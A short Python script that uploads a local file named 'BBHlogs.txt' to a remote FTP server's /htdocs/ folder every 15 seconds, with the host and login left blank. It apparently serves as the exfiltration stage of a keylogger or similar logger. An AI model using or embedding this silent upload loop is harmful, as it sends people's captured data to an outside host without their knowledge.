import ftplib
from ftplib import FTP
import os
import time
import threading

def FTP():
            threading.Timer(15.0, FTP).start()
            filename = "BBHlogs.txt"
            ftp = ftplib.FTP("") # host/ftp url
            ftp.login("", "") # ftp login username, pw
            ftp.cwd("/htdocs/") # directory
            os.chdir(r"") # folder that has the file
            myfile = open(filename, 'rb')
            ftp.storbinary('STOR ' + filename, myfile)
            myfile.close()
            
FTP()

